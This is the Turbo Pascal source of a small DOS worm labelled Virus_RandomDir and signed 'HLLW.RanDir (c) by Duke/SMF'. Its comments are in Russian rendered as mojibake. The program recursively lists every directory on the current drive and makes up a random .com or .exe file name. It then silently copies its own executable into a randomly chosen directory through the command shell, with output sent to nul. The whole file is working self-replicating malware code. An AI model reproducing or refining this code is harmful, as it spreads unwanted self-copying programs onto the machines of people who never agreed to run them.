   {$M 5000, 0, 5000}
   {$I-,S-}
   program Virus_RandomDir;
   uses dos;
   type stack = ^nodestack;
        nodestack = record
                    inf:string[150];
                    next:stack;
                    end;
   var NewName:string;
       Kol,K:integer;
       S,H:stack;
   {---------------------------}
   procedure Search(Dir:string);
   var N:searchrec;
   begin
   Kol:=Kol+1;
   {§ ¯¨á âì â¥ªãéãî ¤¨à¥ªâ®à¨î ¢ áâ¥ª:}
   new(S);
   S^.inf:=Dir;
   S^.next:=H;
   H:=S;
   {¨áª âì ¤àã£¨¥ (¢«®¦¥ë¥) ¤¨à¥ªâ®à¨¨:}
   if Dir[length(Dir)]<>'\'then Dir:=Dir+'\';
   findfirst(Dir+'*.*',$3F,N);
   while doserror=0 do
     begin
     with N do if (Attr and 16<>0) and (Name[1]<>'.')         { è«¨ ¤¨à¥ªâ®à¨î}
       then Search(Dir+Name);
     findnext(N);
     end;
   end;
   {-------------------------}
   procedure MakeRandomName;                             {á®§¤ âì á«ãç ©®¥ ¨¬ï}
   var i,d:byte;
   begin
   d:=random(8)+1;
   NewName:='[HLLW.RanDir (c) by Duke/SMF]';                  {¬®¨ ª®¯¨à ©âë ;)}
   NewName:='';
   for i:=1 to d do NewName:=NewName+chr(random(26)+97);
   d:=random(255);
   if d div 2 = d/2 then NewName:=NewName+'.com' else NewName:=NewName+'.exe';
   end;
   {-----------------------}
   function Put(K:integer):string;
   var j:integer;
   begin
   for j:=1 to K-1 do
     begin
     S:=H;
     H:=H^.next;
     dispose(S);
     end;
   Put:=H^.inf;
   end;
   {---------------------------}
   begin
   Kol:=0;
   H^.next:=nil;
   Search(copy(fexpand(paramstr(0)),1,2));
   Randomize;
   MakeRandomName;
   K:=random(Kol);             {¢§ïâì á«ãç ©®¥ ç¨á«® ®â 0 ¤® ª®«-¢  ¤¨à¥ªâ®à¨©}
   NewName:=Put(K)+'\'+NewName;
   exec(GetEnv('COMSPEC'),'/c copy '+paramstr(0)+' '+NewName+'>nul');
   end.
